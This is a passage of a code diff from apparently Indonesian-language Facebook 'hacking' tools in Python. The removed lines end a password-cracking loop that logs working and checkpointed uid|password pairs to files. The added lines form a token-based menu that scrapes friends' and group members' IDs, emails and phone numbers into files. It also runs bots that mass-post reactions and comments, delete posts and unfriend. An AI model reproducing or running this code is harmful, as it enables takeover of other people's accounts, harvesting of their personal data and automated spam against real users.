-				if uid in oks:pass
-				else:
-					if 'checkpoint' in str(lo):
-						print('\r\r\033[1;34m [BILAL-2F] '+uid+' | '+pas)
-					else:
-						print(f'\r\x1b[1;32m [BILAL-OK] '+uid+' | '+pas)
-						open('/sdcard/BILAL-rnd-OK.txt', 'a').write(uid+'|'+pas+'\n')
-						oks.append(uid)
-						break
-			elif 'checkpoint' in log_cookies:
-				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-				uid=coki[141:156]
-				if uid in cps:pass
-				else:
-					print('\r\r\x1b[38;5;205m [BILAL-CP] '+uid+' | '+pas+'\033[1;97m')
-					open('/sdcard/BILAL-rnd-CP.txt', 'a').write(uid+'|'+pas+'\n')
-					cps.append(ids)
-					break
-			else:
-				continue
-		loop+=1
-	except requests.exceptions.ConnectionError:
-		time.sleep(10)
-	except:
-		pass
-try:
-	menu()
-except requests.exceptions.ConnectionError:
-	print('\n No internet connection ...')
-	exit()
-except:exit()
+                                    if cuih == '0':
+                                        menu_hack()
+                                    else:
+                                        print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m' + cuih + ' \x1b[1;91mTidak ada'
+                                        grab_pilih()
+
+
+def id_teman():
+    os.system('clear')
+    try:
+        toket = open('login.txt', 'r').read()
+    except IOError:
+        print '\x1b[1;91m[!] Token tidak ditemukan'
+        os.system('rm -rf login.txt')
+        time.sleep(1)
+        login()
+    else:
+        try:
+            os.system('clear')
+            print logo
+            print 40 * '\x1b[1;97m\xe2\x95\x90'
+            r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
+            z = json.loads(r.text)
+            save_id = raw_input('\x1b[1;91m[+] \x1b[1;92mSimpan File \x1b[1;97mext(file.txt) \x1b[1;91m: \x1b[1;97m')
+            bz = open(save_id, 'w')
+            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mTunggu sebentar \x1b[1;97m...')
+            print 40 * '\x1b[1;97m\xe2\x95\x90'
+            for ah in z['data']:
+                idteman.append(ah['id'])
+                bz.write(ah['id'] + '\n')
+                print '\r\x1b[1;92mNama\x1b[1;91m  :\x1b[1;97m ' + ah['name']
+                print '\x1b[1;92mID   \x1b[1;91m : \x1b[1;97m' + ah['id']
+                print 40 * '\x1b[1;97m\xe2\x95\x90'
+
+            print '\n\r\x1b[1;91m[+] \x1b[1;97mJumlah ID \x1b[1;96m%s' % len(idteman)
+            print '\x1b[1;91m[+] \x1b[1;97mFile tersimpan \x1b[1;91m: \x1b[1;97m' + save_id
+            bz.close()
+            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
+            grab()
+        except IOError:
+            print '\x1b[1;91m[!] Kesalahan saat membuat file'
+            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
+            grab()
+        except (KeyboardInterrupt, EOFError):
+            print '\x1b[1;91m[!] Terhenti'
+            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
+            grab()
+        except KeyError:
+            os.remove(save_id)
+            print '\x1b[1;91m[!] Kesalahan terjadi'
+            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
+            grab()
+        except requests.exceptions.ConnectionError:
+            print '\x1b[1;91m[\xe2\x9c\x96] Tidak ada koneksi'
+            keluar()
+
+
+def idfrom_teman():
+    os.system('clear')
+    try:
+        toket = open('login.txt', 'r').read()
+    except IOError:
+        print '\x1b[1;91m[!] Token tidak ditemukan'
+        os.system('rm -rf login.txt')
+        time.sleep(1)
+        login()
+    else:
+        try:
+            os.system('clear')
+            print logo
+            print 40 * '\x1b[1;97m\xe2\x95\x90'
+            idt = raw_input('\x1b[1;91m[+] \x1b[1;92mMasukan ID Teman \x1b[1;91m: \x1b[1;97m')
+            try:
+                jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
+                op = json.loads(jok.text)
+                print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mFrom\x1b[1;91m :\x1b[1;97m ' + op['name']
+            except KeyError:
+                print '\x1b[1;91m[!] Belum berteman'
+                raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
+                grab()
+
+            r = requests.get('https://graph.facebook.com/' + idt + '?fields=friends.limit(5000)&access_token=' + toket)
+            z = json.loads(r.text)
+            save_idt = raw_input('\x1b[1;91m[+] \x1b[1;92mSimpan File \x1b[1;97mext(file.txt) \x1b[1;91m: \x1b[1;97m')
+            bz = open(save_idt, 'w')
+            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mTunggu sebentar \x1b[1;97m...')
+            print 40 * '\x1b[1;97m\xe2\x95\x90'
+            for ah in z['friends']['data']:
+                idfromteman.append(ah['id'])
+                bz.write(ah['id'] + '\n')
+                print '\r\x1b[1;92mNama\x1b[1;91m  :\x1b[1;97m ' + ah['name']
+                print '\x1b[1;92mID   \x1b[1;91m : \x1b[1;97m' + ah['id']
+                print 40 * '\x1b[1;97m\xe2\x95\x90'
+
+            print '\n\r\x1b[1;91m[+] \x1b[1;97mJumlah ID \x1b[1;96m%s' % len(idfromteman)
+            print '\x1b[1;91m[+] \x1b[1;97mFile tersimpan \x1b[1;91m: \x1b[1;97m' + save_idt
+            bz.close()
+            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
+            grab()
+        except IOError:
+            print '\x1b[1;91m[!] Kesalahan saat membuat file'
+            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
+            grab()
+        except (KeyboardInterrupt, EOFError):
+            print '\x1b[1;91m[!] Terhenti'
+            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
+            grab()
+        except requests.exceptions.ConnectionError:
+            print '\x1b[1;91m[\xe2\x9c\x96] Tidak ada koneksi'
+            keluar()
+
+
+def id_member_grup():
+    os.system('clear')
+    try:
+        toket = open('login.txt', 'r').read()
+    except IOError:
+        print '\x1b[1;91m[!] Token tidak ditemukan'
+        os.system('rm -rf login.txt')
+        time.sleep(1)
+        login()
+    else:
+        try:
+            os.system('clear')
+            print logo
+            print 40 * '\x1b[1;97m\xe2\x95\x90'
+            id = raw_input('\x1b[1;91m[+] \x1b[1;92mID grup \x1b[1;91m:\x1b[1;97m ')
+            try:
+                r = requests.get('https://graph.facebook.com/group/?id=' + id + '&access_token=' + toket)
+                asw = json.loads(r.text)
+                print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mNama grup \x1b[1;91m:\x1b[1;97m ' + asw['name']
+            except KeyError:
+                print '\x1b[1;91m[!] Grup tidak ditemukan'
+                raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
+                grab()
+
+            simg = raw_input('\x1b[1;91m[+] \x1b[1;97mSimpan File \x1b[1;97mext(file.txt) \x1b[1;91m: \x1b[1;97m')
+            b = open(simg, 'w')
+            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mTunggu sebentar \x1b[1;97m...')
+            print 40 * '\x1b[1;97m\xe2\x95\x90'
+            re = requests.get('https://graph.facebook.com/' + id + '/members?fields=name,id&access_token=' + toket)
+            s = json.loads(re.text)
+            for i in s['data']:
+                idmem.append(i['id'])
+                b.write(i['id'] + '\n')
+                print '\r\x1b[1;92mNama\x1b[1;91m  :\x1b[1;97m ' + i['name']
+                print '\x1b[1;92mID  \x1b[1;91m  :\x1b[1;97m ' + i['id']
+                print 40 * '\x1b[1;97m\xe2\x95\x90'
+
+            print '\n\r\x1b[1;91m[+] \x1b[1;97mJumlah ID \x1b[1;96m%s' % len(idmem)
+            print '\x1b[1;91m[+] \x1b[1;97mFile tersimpan \x1b[1;91m: \x1b[1;97m' + simg
+            b.close()
+            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
+            grab()
+        except IOError:
+            print '\x1b[1;91m[!] Kesalahan saat membuat file'
+            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
+            grab()
+        except (KeyboardInterrupt, EOFError):
+            print '\x1b[1;91m[!] Terhenti'
+            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
+            grab()
+        except KeyError:
+            os.remove(simg)
+            print '\x1b[1;91m[!] Grup tidak ditemukan'
+            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
+            grab()
+        except requests.exceptions.ConnectionError:
+            print '\x1b[1;91m[\xe2\x9c\x96] Tidak ada koneksi'
+            keluar()
+
+
+def email():
+    os.system('clear')
+    try:
+        toket = open('login.txt', 'r').read()
+    except IOError:
+        print '\x1b[1;91m[!] Token tidak ditemukan'
+        os.system('rm -rf login.txt')
+        time.sleep(1)
+        login()
+    else:
+        try:
+            os.system('clear')
+            print logo
+            print 40 * '\x1b[1;97m\xe2\x95\x90'
+            mails = raw_input('\x1b[1;91m[+] \x1b[1;92mSimpan File \x1b[1;97mext(file.txt) \x1b[1;91m: \x1b[1;97m')
+            r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
+            a = json.loads(r.text)
+            mpsh = open(mails, 'w')
+            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mTunggu sebentar \x1b[1;97m...')
+            print 40 * '\x1b[1;97m\xe2\x95\x90'
+            for i in a['data']:
+                x = requests.get('https://graph.facebook.com/' + i['id'] + '?access_token=' + toket)
+                z = json.loads(x.text)
+                try:
+                    em.append(z['email'])
+                    mpsh.write(z['email'] + '\n')
+                    print '\r\x1b[1;92mNama\x1b[1;91m  :\x1b[1;97m ' + z['name']
+                    print '\x1b[1;92mEmail\x1b[1;91m : \x1b[1;97m' + z['email']
+                    print 40 * '\x1b[1;97m\xe2\x95\x90'
+                except KeyError:
+                    pass
+
+            print '\n\r\x1b[1;91m[+] \x1b[1;97mJumlah Email\x1b[1;96m%s' % len(em)
+            print '\x1b[1;91m[+] \x1b[1;97mFile tersimpan \x1b[1;91m: \x1b[1;97m' + mails
+            mpsh.close()
+            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
+            grab()
+        except IOError:
+            print '\x1b[1;91m[!] Kesalahan saat membuat file'
+            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
+            grab()
+        except (KeyboardInterrupt, EOFError):
+            print '\x1b[1;91m[!] Terhenti'
+            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
+            grab()
+        except KeyError:
+            os.remove(mails)
+            print '\x1b[1;91m[!] Kesalahan terjadi'
+            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
+            grab()
+        except requests.exceptions.ConnectionError:
+            print '\x1b[1;91m[\xe2\x9c\x96] Tidak ada koneksi'
+            keluar()
+
+
+def emailfrom_teman():
+    os.system('clear')
+    try:
+        toket = open('login.txt', 'r').read()
+    except IOError:
+        print '\x1b[1;91m[!] Token tidak ditemukan'
+        os.system('rm -rf login.txt')
+        time.sleep(1)
+        login()
+    else:
+        try:
+            os.system('clear')
+            print logo
+            print 40 * '\x1b[1;97m\xe2\x95\x90'
+            idt = raw_input('\x1b[1;91m[+] \x1b[1;92mMasukan ID Teman \x1b[1;91m: \x1b[1;97m')
+            try:
+                jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
+                op = json.loads(jok.text)
+                print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mFrom\x1b[1;91m :\x1b[1;97m ' + op['name']
+            except KeyError:
+                print '\x1b[1;91m[!] Belum berteman'
+                raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
+                grab()
+
+            mails = raw_input('\x1b[1;91m[+] \x1b[1;92mSimpan File \x1b[1;97mext(file.txt) \x1b[1;91m: \x1b[1;97m')
+            r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
+            a = json.loads(r.text)
+            mpsh = open(mails, 'w')
+            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mTunggu sebentar \x1b[1;97m...')
+            print 40 * '\x1b[1;97m\xe2\x95\x90'
+            for i in a['data']:
+                x = requests.get('https://graph.facebook.com/' + i['id'] + '?access_token=' + toket)
+                z = json.loads(x.text)
+                try:
+                    emfromteman.append(z['email'])
+                    mpsh.write(z['email'] + '\n')
+                    print '\r\x1b[1;92mNama\x1b[1;91m  :\x1b[1;97m ' + z['name']
+                    print '\x1b[1;92mEmail\x1b[1;91m : \x1b[1;97m' + z['email']
+                    print 40 * '\x1b[1;97m\xe2\x95\x90'
+                except KeyError:
+                    pass
+
+            print '\n\r\x1b[1;91m[+] \x1b[1;97mJumlah Email\x1b[1;96m%s' % len(emfromteman)
+            print '\x1b[1;91m[+] \x1b[1;97mFile tersimpan \x1b[1;91m: \x1b[1;97m' + mails
+            mpsh.close()
+            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
+            grab()
+        except IOError:
+            print '\x1b[1;91m[!] Kesalahan saat membuat file'
+            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
+            grab()
+        except (KeyboardInterrupt, EOFError):
+            print '\x1b[1;91m[!] Terhenti'
+            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
+            grab()
+        except requests.exceptions.ConnectionError:
+            print '\x1b[1;91m[\xe2\x9c\x96] Tidak ada koneksi'
+            keluar()
+
+
+def nomor_hp():
+    os.system('clear')
+    try:
+        toket = open('login.txt', 'r').read()
+    except IOError:
+        print '\x1b[1;91m[!] Token tidak ditemukan'
+        os.system('rm -rf login.txt')
+        time.sleep(1)
+        login()
+    else:
+        try:
+            os.system('clear')
+            print logo
+            print 40 * '\x1b[1;97m\xe2\x95\x90'
+            noms = raw_input('\x1b[1;91m[+] \x1b[1;92mSimpan File \x1b[1;97mext(file.txt) \x1b[1;91m: \x1b[1;97m')
+            url = 'https://graph.facebook.com/me/friends?access_token=' + toket
+            r = requests.get(url)
+            z = json.loads(r.text)
+            no = open(noms, 'w')
+            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mTunggu sebentar \x1b[1;97m...')
+            print 40 * '\x1b[1;97m\xe2\x95\x90'
+            for n in z['data']:
+                x = requests.get('https://graph.facebook.com/' + n['id'] + '?access_token=' + toket)
+                z = json.loads(x.text)
+                try:
+                    hp.append(z['mobile_phone'])
+                    no.write(z['mobile_phone'] + '\n')
+                    print '\r\x1b[1;92mNama\x1b[1;91m  :\x1b[1;97m ' + z['name']
+                    print '\x1b[1;92mNomor\x1b[1;91m : \x1b[1;97m' + z['mobile_phone']
+                    print 40 * '\x1b[1;97m\xe2\x95\x90'
+                except KeyError:
+                    pass
+
+            print '\n\r\x1b[1;91m[+] \x1b[1;97mJumlah Nomor\x1b[1;96m%s' % len(hp)
+            print '\x1b[1;91m[+] \x1b[1;97mFile tersimpan \x1b[1;91m: \x1b[1;97m' + noms
+            no.close()
+            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
+            grab()
+        except IOError:
+            print '\x1b[1;91m[!] Kesalahan saat membuat file'
+            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
+            grab()
+        except (KeyboardInterrupt, EOFError):
+            print '\x1b[1;91m[!] Terhenti'
+            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
+            grab()
+        except KeyError:
+            os.remove(noms)
+            print '\x1b[1;91m[!] Kesalahan terjadi'
+            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
+            grab()
+        except requests.exceptions.ConnectionError:
+            print '\x1b[1;91m[\xe2\x9c\x96] Tidak ada koneksi'
+            keluar()
+
+
+def hpfrom_teman():
+    os.system('clear')
+    try:
+        toket = open('login.txt', 'r').read()
+    except IOError:
+        print '\x1b[1;91m[!] Token tidak ditemukan'
+        os.system('rm -rf login.txt')
+        time.sleep(1)
+        login()
+    else:
+        try:
+            os.system('clear')
+            print logo
+            print 40 * '\x1b[1;97m\xe2\x95\x90'
+            idt = raw_input('\x1b[1;91m[+] \x1b[1;92mMasukan ID Teman \x1b[1;91m: \x1b[1;97m')
+            try:
+                jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
+                op = json.loads(jok.text)
+                print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mFrom\x1b[1;91m :\x1b[1;97m ' + op['name']
+            except KeyError:
+                print '\x1b[1;91m[!] Belum berteman'
+                raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
+                grab()
+
+            noms = raw_input('\x1b[1;91m[+] \x1b[1;92mSimpan File \x1b[1;97mext(file.txt) \x1b[1;91m: \x1b[1;97m')
+            r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
+            a = json.loads(r.text)
+            no = open(noms, 'w')
+            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mTunggu sebentar \x1b[1;97m...')
+            print 40 * '\x1b[1;97m\xe2\x95\x90'
+            for i in a['data']:
+                x = requests.get('https://graph.facebook.com/' + i['id'] + '?access_token=' + toket)
+                z = json.loads(x.text)
+                try:
+                    hpfromteman.append(z['mobile_phone'])
+                    no.write(z['mobile_phone'] + '\n')
+                    print '\r\x1b[1;92mNama\x1b[1;91m  :\x1b[1;97m ' + z['name']
+                    print '\x1b[1;92mNomor\x1b[1;91m : \x1b[1;97m' + z['mobile_phone']
+                    print 40 * '\x1b[1;97m\xe2\x95\x90'
+                except KeyError:
+                    pass
+
+            print '\n\r\x1b[1;91m[+] \x1b[1;97mJumlah Nomor\x1b[1;96m%s' % len(hpfromteman)
+            print '\x1b[1;91m[+] \x1b[1;97mFile tersimpan \x1b[1;91m: \x1b[1;97m' + noms
+            no.close()
+            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
+            grab()
+        except IOError:
+            print '\x1b[1;91m[!] Kesalahan saat membuat file'
+            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
+            grab()
+        except (KeyboardInterrupt, EOFError):
+            print '\x1b[1;91m[!] Terhenti'
+            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
+            grab()
+        except requests.exceptions.ConnectionError:
+            print '\x1b[1;91m[\xe2\x9c\x96] Tidak ada koneksi'
+            keluar()
+
+
+def menu_bot():
+    os.system('clear')
+    try:
+        toket = open('login.txt', 'r').read()
+    except IOError:
+        print '\x1b[1;91m[!] Token tidak ditemukan'
+        os.system('rm -rf login.txt')
+        time.sleep(1)
+        login()
+
+    os.system('clear')
+    print logo
+    print 40 * '\x1b[1;97m\xe2\x95\x90'
+    print '\x1b[1;37;40m1. Bot Reactions Target Post'
+    print '\x1b[1;37;40m2. Bot Reactions Grup Post'
+    print '\x1b[1;37;40m3. Bot Komen Target Post'
+    print '\x1b[1;37;40m4. Bot Komen Grup Post'
+    print '\x1b[1;37;40m5. Mass delete Post'
+    print '\x1b[1;37;40m6. Terima permintaan pertemanan'
+    print '\x1b[1;37;40m7. Hapus pertemanan'
+    print '\x1b[1;31;40m0. Kembali'
+    print
+    bot_pilih()
+
+
+def bot_pilih():
+    bots = raw_input('\x1b[1;91m-\xe2\x96\xba\x1b[1;97m ')
+    if bots == '':
+        print '\x1b[1;91m[!] Jangan kosong'
+        bot_pilih()
+    else:
+        if bots == '1':
+            menu_react()
+        else:
+            if bots == '2':
+                grup_react()
+            else:
+                if bots == '3':
+                    bot_komen()
+                else:
+                    if bots == '4':
+                        grup_komen()
+                    else:
+                        if bots == '5':
+                            deletepost()
+                        else:
+                            if bots == '6':
+                                accept()
+                            else:
+                                if bots == '7':
+                                    unfriend()
+                                else:
+                                    if bots == '0':
+                                        menu()
+                                    else:
+                                        print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m' + bots + ' \x1b[1;91mTidak ada'
+                                        bot_pilih()
+
+
+def menu_react():
+    os.system('clear')
+    try:
+        toket = open('login.txt', 'r').read()
+    except IOError:
+        print '\x1b[1;91m[!] Token tidak ditemukan'
+        os.system('rm -rf login.txt')
+        time.sleep(1)
+        login()
+
+    os.system('clear')
+    print logo
+    print 40 * '\x1b[1;97m\xe2\x95\x90'
+    print '\x1b[1;37;40m1. \x1b[1;97mLike'
+    print '\x1b[1;37;40m2. \x1b[1;97mLove'
+    print '\x1b[1;37;40m3. \x1b[1;97mWow'
+    print '\x1b[1;37;40m4. \x1b[1;97mHaha'
+    print '\x1b[1;37;40m5. \x1b[1;97mSedih'
+    print '\x1b[1;37;40m6. \x1b[1;97mMarah'
+    print '\x1b[1;31;40m0. Kembali'
+    print
+    react_pilih()
+
+
+def react_pilih():
+    global tipe
+    aksi = raw_input('\x1b[1;91m-\xe2\x96\xba\x1b[1;97m ')
+    if aksi == '':
+        print '\x1b[1;91m[!] Jangan kosong'
+        react_pilih()
+    else:
+        if aksi == '1':
+            tipe = 'LIKE'
+            react()
+        else:
+            if aksi == '2':
+                tipe = 'LOVE'
+                react()
+            else:
+                if aksi == '3':
+                    tipe = 'WOW'
+                    react()
+                else:
+                    if aksi == '4':
+                        tipe = 'HAHA'
+                        react()
+                    else:
+                        if aksi == '5':
+                            tipe = 'SAD'
+                            react()
+                        else:
+                            if aksi == '6':
+                                tipe = 'ANGRY'
+                                react()
+                            else:
+                                if aksi == '0':
+                                    menu_bot()
+                                else:
+                                    print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m' + aksi + ' \x1b[1;91mTidak ada'
+                                    react_pilih()
+
+
+def react():
+    os.system('clear')
+    try:
+        toket = open('login.txt', 'r').read()
+    except IOError:
+        print '\x1b[1;91m[!] Token tidak ditemukan'
+        os.system('rm -rf login.txt')
+        time.sleep(1)
+        login()
+    else:
+        os.system('clear')
+        print logo
+        print 40 * '\x1b[1;97m\xe2\x95\x90'
+        ide = raw_input('\x1b[1;91m[+] \x1b[1;92mID Target \x1b[1;91m:\x1b[1;97m ')
+        limit = raw_input('\x1b[1;91m[!] \x1b[1;92mLimit \x1b[1;91m:\x1b[1;97m ')
+        try:
+            oh = requests.get('https://graph.facebook.com/' + ide + '?fields=feed.limit(' + limit + ')&access_token=' + toket)
+            ah = json.loads(oh.text)
+            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mTunggu sebentar \x1b[1;97m...')
+            print 40 * '\x1b[1;97m\xe2\x95\x90'
+            for a in ah['feed']['data']:
+                y = a['id']
+                reaksi.append(y)
+                requests.post('https://graph.facebook.com/' + y + '/reactions?type=' + tipe + '&access_token=' + toket)
+                print '\x1b[1;92m[\x1b[1;97m' + y[:10].replace('\n', ' ') + '... \x1b[1;92m] \x1b[1;97m' + tipe
+
+            print
+            print '\r\x1b[1;91m[+]\x1b[1;97m Selesai \x1b[1;96m' + str(len(reaksi))
+            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
+            menu_bot()
+        except KeyError:
+            print '\x1b[1;91m[!] ID Tidak ditemukan'
+            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
+            menu_bot()
+
+
+def grup_react():
+    os.system('clear')
+    try:
+        toket = open('login.txt', 'r').read()
+    except IOError:
+        print '\x1b[1;91m[!] Token tidak ditemukan'
+        os.system('rm -rf login.txt')
+        time.sleep(1)
+        login()
+
+    os.system('clear')
+    print logo
+    print 40 * '\x1b[1;97m\xe2\x95\x90'
+    print '\x1b[1;37;40m1. \x1b[1;97mLike'
+    print '\x1b[1;37;40m2. \x1b[1;97mLove'
+    print '\x1b[1;37;40m3. \x1b[1;97mWow'
+    print '\x1b[1;37;40m4. \x1b[1;97mHaha'
+    print '\x1b[1;37;40m5. \x1b[1;97mSedih'
+    print '\x1b[1;37;40m6. \x1b[1;97mMarah'
+    print '\x1b[1;31;40m0. Kembali'
+    print
+    reactg_pilih()
+
+
+def reactg_pilih():
+    global tipe
+    aksi = raw_input('\x1b[1;91m-\xe2\x96\xba\x1b[1;97m ')
+    if aksi == '':
+        print '\x1b[1;91m[!] Jangan kosong'
+        reactg_pilih()
+    else:
+        if aksi == '1':
+            tipe = 'LIKE'
+            reactg()
+        else:
+            if aksi == '2':
+                tipe = 'LOVE'
+                reactg()
+            else:
+                if aksi == '3':
+                    tipe = 'WOW'
+                    reactg()
+                else:
+                    if aksi == '4':
+                        tipe = 'HAHA'
+                        reactg()
+                    else:
+                        if aksi == '5':
+                            tipe = 'SAD'
+                            reactg()
+                        else:
+                            if aksi == '6':
+                                tipe = 'ANGRY'
+                                reactg()
+                            else:
+                                if aksi == '0':
+                                    menu_bot()
+                                else:
+                                    print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m' + aksi + ' \x1b[1;91mTidak ada'
+                                    reactg_pilih()
+
+
+def reactg():
+    os.system('clear')
+    try:
+        toket = open('login.txt', 'r').read()
+    except IOError:
+        print '\x1b[1;91m[!] Token tidak ditemukan'
+        os.system('rm -rf login.txt')
+        time.sleep(1)
+        login()
+    else:
+        os.system('clear')
+        print logo
+        print 40 * '\x1b[1;97m\xe2\x95\x90'
+        ide = raw_input('\x1b[1;91m[+] \x1b[1;92mID Grup \x1b[1;91m:\x1b[1;97m ')
+        limit = raw_input('\x1b[1;91m[!] \x1b[1;92mLimit \x1b[1;91m:\x1b[1;97m ')
+        ah = requests.get('https://graph.facebook.com/group/?id=' + ide + '&access_token=' + toket)
+        asw = json.loads(ah.text)
+        print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mNama grup \x1b[1;91m:\x1b[1;97m ' + asw['name']
+        try:
+            oh = requests.get('https://graph.facebook.com/v3.0/' + ide + '?fields=feed.limit(' + limit + ')&access_token=' + toket)
+            ah = json.loads(oh.text)
+            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mTunggu sebentar \x1b[1;97m...')
+            print 40 * '\x1b[1;97m\xe2\x95\x90'
+            for a in ah['feed']['data']:
+                y = a['id']
+                reaksigrup.append(y)
+                requests.post('https://graph.facebook.com/' + y + '/reactions?type=' + tipe + '&access_token=' + toket)
+                print '\x1b[1;92m[\x1b[1;97m' + y[:10].replace('\n', ' ') + '... \x1b[1;92m] \x1b[1;97m' + tipe
+
+            print
+            print '\r\x1b[1;91m[+]\x1b[1;97m Selesai \x1b[1;96m' + str(len(reaksigrup))
+            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
+            menu_bot()
+        except KeyError:
+            print '\x1b[1;91m[!] ID Tidak ditemukan'
+            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
+            menu_bot()
+
+
+def bot_komen():
+    os.system('clear')
+    try:
+        toket = open('login.txt', 'r').read()
+    except IOError:
+        print '\x1b[1;91m[!] Token tidak ditemukan'
+        os.system('rm -rf login.txt')
+        time.sleep(1)
+        login()
+    else:
+        os.system('clear')
+        print logo
+        print 40 * '\x1b[1;97m\xe2\x95\x90'
+        print "\x1b[1;91m[!] \x1b[1;92mGunakan \x1b[1;97m'<>' \x1b[1;92mUntuk Baris Baru"
+        ide = raw_input('\x1b[1;91m[+] \x1b[1;92mID Target \x1b[1;91m:\x1b[1;97m ')
+        km = raw_input('\x1b[1;91m[+] \x1b[1;92mKomentar  \x1b[1;91m:\x1b[1;97m ')
+        limit = raw_input('\x1b[1;91m[!] \x1b[1;92mLimit \x1b[1;91m:\x1b[1;97m ')
+        km = km.replace('<>', '\n')
+        try:
+            p = requests.get('https://graph.facebook.com/' + ide + '?fields=feed.limit(' + limit + ')&access_token=' + toket)
+            a = json.loads(p.text)
+            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mTunggu sebentar \x1b[1;97m...')
+            print 40 * '\x1b[1;97m\xe2\x95\x90'
+            for s in a['feed']['data']:
+                f = s['id']
+                komen.append(f)
+                requests.post('https://graph.facebook.com/' + f + '/comments?message=' + km + '&access_token=' + toket)
+                print '\x1b[1;92m[\x1b[1;97m' + km[:10].replace('\n', ' ') + '... \x1b[1;92m]'
+
+            print
+            print '\r\x1b[1;91m[+]\x1b[1;97m Selesai \x1b[1;96m' + str(len(komen))
+            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
+            menu_bot()
+        except KeyError:
+            print '\x1b[1;91m[!] ID Tidak ditemukan'
+            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
+            menu_bot()
+
+
+def grup_komen():
+    os.system('clear')
+    try:
+        toket = open('login.txt', 'r').read()
+    except IOError:
+        print '\x1b[1;91m[!] Token tidak ditemukan'
+        os.system('rm -rf login.txt')
+        time.sleep(1)
+        login()
+    else:
+        os.system('clear')
+        print logo
+        print 40 * '\x1b[1;97m\xe2\x95\x90'
+        print "\x1b[1;91m[!] \x1b[1;92mGunakan \x1b[1;97m'<>' \x1b[1;92mUntuk Baris Baru"
+        ide = raw_input('\x1b[1;91m[+] \x1b[1;92mID Grup  \x1b[1;91m:\x1b[1;97m ')
+        km = raw_input('\x1b[1;91m[+] \x1b[1;92mKomentar \x1b[1;91m:\x1b[1;97m ')
+        limit = raw_input('\x1b[1;91m[!] \x1b[1;92mLimit \x1b[1;91m:\x1b[1;97m ')
+        km = km.replace('<>', '\n')
+        try:
+            ah = requests.get('https://graph.facebook.com/group/?id=' + ide + '&access_token=' + toket)
+            asw = json.loads(ah.text)
